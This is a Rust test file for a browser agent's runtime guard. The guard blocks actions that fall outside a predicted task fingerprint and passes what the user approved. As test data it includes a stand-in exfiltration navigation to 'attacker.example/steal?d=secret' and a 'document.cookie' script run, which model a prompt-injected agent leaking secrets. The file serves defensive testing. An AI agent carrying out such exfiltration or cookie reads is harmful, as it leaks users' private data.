//! The runtime guard inside the live loop (ADR-014): the predicted fingerprint
//! is binding on the real run, what the user approved is let through, and the
//! agent learns nothing from a block beyond the fact of it.

use super::*;

use ferrite_core::scope::OriginScope;
use ferrite_core::{Capability, ExpectedCapability, ExpectedCapabilitySet, Origin};
use ferrite_ipi::comparator::RuntimeGuard;

use crate::runtime_guard::{BLOCKED_OBSERVATION, MAX_GUARD_BLOCKS};

fn origin(s: &str) -> Origin {
    Origin::parse(s).unwrap_or_else(|e| panic!("{s}: {e}"))
}

/// A news-reading task: navigate and read, both scoped to news.example.
fn news_task() -> ExpectedFingerprint {
    let scope = || OriginScope::exact([origin("https://news.example")]).expect("non-empty");
    ExpectedFingerprint::from_capabilities(
        ExpectedCapabilitySet::new([
            ExpectedCapability::new(Capability::WebNavigate, scope()),
            ExpectedCapability::new(Capability::WebRead, scope()),
        ])
        .expect("distinct"),
    )
}

fn guarded(guard: Option<RuntimeGuard>) -> FerriteBrowser {
    let live = LiveAgentLoop::new(
        "go".into(),
        "go".into(),
        Default::default(),
        Default::default(),
    )
    .with_guard(guard);
    FerriteBrowser {
        run_id: 1,
        live_loop: Some(live),
        tab_urls: vec!["https://news.example/".into()],
        ..FerriteBrowser::default()
    }
}

fn step(state: &mut FerriteBrowser, action: AgentAction) {
    let _ = update(
        state,
        FerriteBrowserMessage::AgentStepReady {
            run_id: 1,
            action: Ok(action),
        },
    );
}

fn last_observation(state: &FerriteBrowser) -> String {
    state
        .live_loop
        .as_ref()
        .and_then(|l| l.messages.last())
        .map(|m| m.content.clone())
        .expect("the loop continues and recorded an observation")
}

fn last_step_entry(state: &FerriteBrowser) -> (bool, String) {
    match state.agent_log.last() {
        Some(AgentLogEntry::Step {
            blocked, result, ..
        }) => (*blocked, result.clone()),
        other => panic!("expected a Step entry, got {other:?}"),
    }
}

#[tokio::test]
async fn an_unexpected_navigation_is_blocked_and_the_agent_is_told_nothing_about_where() {
    let mut state = guarded(Some(RuntimeGuard::new(news_task())));
    step(
        &mut state,
        AgentAction::Navigate {
            url: "https://attacker.example/steal?d=secret".into(),
        },
    );

    let seen_by_the_agent = last_observation(&state);
    assert!(
        seen_by_the_agent.contains(BLOCKED_OBSERVATION),
        "{seen_by_the_agent}"
    );
    assert!(!seen_by_the_agent.contains("attacker") && !seen_by_the_agent.contains("secret"));

    // The user, in the log, sees what was blocked and why.
    let (blocked, shown) = last_step_entry(&state);
    assert!(blocked);
    assert!(
        shown.contains("attacker.example") && shown.contains("not approved"),
        "{shown}"
    );
}

#[tokio::test]
async fn an_expected_action_is_not_blocked() {
    let mut state = guarded(Some(RuntimeGuard::new(news_task())));
    step(
        &mut state,
        AgentAction::Navigate {
            url: "https://news.example/world".into(),
        },
    );
    let observation = last_observation(&state);
    assert!(!observation.contains("blocked"), "{observation}");
    assert!(!last_step_entry(&state).0);
}

#[tokio::test]
async fn an_unexpected_primitive_at_the_expected_origin_is_blocked() {
    let mut state = guarded(Some(RuntimeGuard::new(news_task())));
    for action in [
        AgentAction::Download {
            url: "https://news.example/report.pdf".into(),
        },
        AgentAction::ClipboardRead,
        AgentAction::TypeText {
            selector: "@1".into(),
            text: "hello".into(),
        },
    ] {
        step(&mut state, action.clone());
        assert!(
            last_observation(&state).contains(BLOCKED_OBSERVATION),
            "{action:?}"
        );
        // Keep the run going for the next action.
        state.live_loop.as_mut().expect("loop").guard_blocks = 0;
    }
}

#[tokio::test]
async fn js_execute_is_blocked_even_under_the_widest_scope() {
    let open = || OriginScope::task_open("user said browse anywhere").expect("rationale");
    let wide = ExpectedFingerprint::from_capabilities(
        ExpectedCapabilitySet::new([
            ExpectedCapability::new(Capability::WebNavigate, open()),
            ExpectedCapability::new(Capability::WebRead, open()),
            ExpectedCapability::new(Capability::WebInteract, open()),
            ExpectedCapability::new(Capability::WebDownload, open()),
        ])
        .expect("distinct"),
    );
    let mut state = guarded(Some(RuntimeGuard::new(wide)));
    step(
        &mut state,
        AgentAction::JsExecute {
            script: "document.cookie".into(),
        },
    );
    assert!(last_observation(&state).contains(BLOCKED_OBSERVATION));
}

#[tokio::test]
async fn what_the_user_approved_passes_and_nothing_else_does() {
    let guard = RuntimeGuard::new(news_task()).with_approvals(
        [ToolId::new("clipboard.read")],
        ["https://cdn.example".to_string()],
    );
    let mut state = guarded(Some(guard));

    step(&mut state, AgentAction::ClipboardRead);
    assert!(
        !last_observation(&state).contains("blocked"),
        "approved tool was blocked"
    );

    step(
        &mut state,
        AgentAction::Navigate {
            url: "https://cdn.example/lib.js".into(),
        },
    );
    assert!(
        !last_observation(&state).contains("blocked"),
        "approved origin was blocked"
    );

    step(&mut state, AgentAction::ClipboardWrite { text: "x".into() });
    assert!(
        last_observation(&state).contains(BLOCKED_OBSERVATION),
        "unapproved tool passed"
    );
    step(
        &mut state,
        AgentAction::Navigate {
            url: "https://other.example".into(),
        },
    );
    assert!(
        last_observation(&state).contains(BLOCKED_OBSERVATION),
        "unapproved origin passed"
    );
}

#[tokio::test]
async fn an_empty_prediction_blocks_everything_until_the_user_approves_it() {
    let mut state = guarded(Some(RuntimeGuard::new(ExpectedFingerprint::empty())));
    step(&mut state, AgentAction::ReadPage);
    assert!(last_observation(&state).contains(BLOCKED_OBSERVATION));
}

#[tokio::test]
async fn a_run_that_keeps_probing_is_stopped_after_a_few_blocks() {
    let mut state = guarded(Some(RuntimeGuard::new(news_task())));
    for i in 0..MAX_GUARD_BLOCKS {
        assert!(state.live_loop.is_some(), "stopped early, after {i} blocks");
        step(
            &mut state,
            AgentAction::Navigate {
                url: format!("https://attacker{i}.example/"),
            },
        );
    }
    assert!(
        state.live_loop.is_none(),
        "the run must end once the guard has blocked {MAX_GUARD_BLOCKS} actions"
    );
    assert!(!state.agent_is_running);
}

#[tokio::test]
async fn with_no_guard_nothing_is_blocked_by_it() {
    // The defense is off for this run (FERRITE_DEFENSE=off, or sanitizer-only).
    let mut state = guarded(None);
    step(
        &mut state,
        AgentAction::Navigate {
            url: "https://attacker.example/".into(),
        },
    );
    assert!(!last_observation(&state).contains("blocked"));
}

#[tokio::test]
async fn blocked_actions_and_approved_deviations_are_counted_only_when_blocked() {
    let guard = RuntimeGuard::new(news_task()).with_approvals([ToolId::new("clipboard.read")], []);
    let mut state = guarded(Some(guard));
    step(&mut state, AgentAction::ClipboardRead);
    assert_eq!(state.live_loop.as_ref().expect("loop").guard_blocks, 0);
    step(
        &mut state,
        AgentAction::Navigate {
            url: "https://attacker.example/".into(),
        },
    );
    assert_eq!(state.live_loop.as_ref().expect("loop").guard_blocks, 1);
}

#[tokio::test]
async fn consent_approvals_reach_the_guard_and_unapproved_items_stay_blocked() {
    let mut state = FerriteBrowser::default();
    let task = IpiTask::new("t", None);
    state.pending_task = Some(task.prompt.clone());
    let mut diff = FingerprintDiff::default();
    diff.extra_primitives.insert(ToolId::new("clipboard.read"));
    diff.out_of_scope_origins
        .insert("https://files.example".to_string());
    let evidence = ferrite_ipi::dry_run::DryRunRecord::new(task.session_id, task.task_id);
    let _ = update(
        &mut state,
        FerriteBrowserMessage::ConsentRequired {
            diff,
            expected: news_task(),
            evidence: Box::new(evidence),
        },
    );
    // Approve the tool, reject the origin.
    let _ = update(
        &mut state,
        FerriteBrowserMessage::ApproveTool("clipboard.read".into()),
    );
    let _ = update(
        &mut state,
        FerriteBrowserMessage::RejectTool(origin_item_id("https://files.example").to_string()),
    );
    let _ = update(&mut state, FerriteBrowserMessage::ConsentSubmitted);

    let guard = state
        .live_loop
        .as_ref()
        .and_then(|l| l.guard.clone())
        .expect("the post-consent run carries a guard built from the prediction and the approvals");
    assert!(guard
        .check(
            ferrite_core::Primitive::ClipboardRead,
            Some("https://news.example")
        )
        .allows());
    // The rejected origin is neither expected nor approved.
    assert!(!guard
        .check(
            ferrite_core::Primitive::Navigate,
            Some("https://files.example")
        )
        .allows());
    // And the rest of the prediction still holds.
    assert!(guard
        .check(
            ferrite_core::Primitive::Navigate,
            Some("https://news.example")
        )
        .allows());
}
